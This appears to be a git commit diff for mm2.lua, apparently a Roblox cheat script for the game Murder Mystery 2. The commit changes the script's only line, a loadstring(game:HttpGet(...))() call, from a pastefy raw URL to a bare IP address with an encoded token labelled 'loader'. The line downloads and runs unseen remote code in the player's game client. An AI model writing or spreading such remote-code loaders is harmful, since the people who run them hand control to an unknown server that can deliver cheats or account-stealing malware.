b657f7333a663f8b2f7818a13b12f7580d55ded1
proplayer123-z <idkfrcap@gmail.com>
2026-01-07 16:16:13 +0800

    Update loadstring URL in mm2.lua

--- mm2.lua
+++ mm2.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://pastefy.app/qTLAutgs/raw"))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjdlOGQ5MWM3LTYwMmMtNDVjNy05YzFkLTQ5YjhiZDJjYzgyNCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
